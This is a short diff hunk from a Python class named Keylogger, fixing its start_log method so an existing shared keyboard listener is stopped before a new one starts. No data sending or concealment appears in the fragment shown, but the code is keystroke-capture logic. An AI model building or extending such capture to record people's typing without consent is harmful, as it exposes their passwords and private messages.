@@ -24,7 +24,7 @@ class Keylogger:
 
     def start_log(self):
         if Keylogger.shared_listener is not None:
-            self.listener.stop()
+            Keylogger.shared_listener.stop()
 
         Keylogger.shared_listener = Listener(on_press=self.key_pressed)
         Keylogger.shared_listener.start()
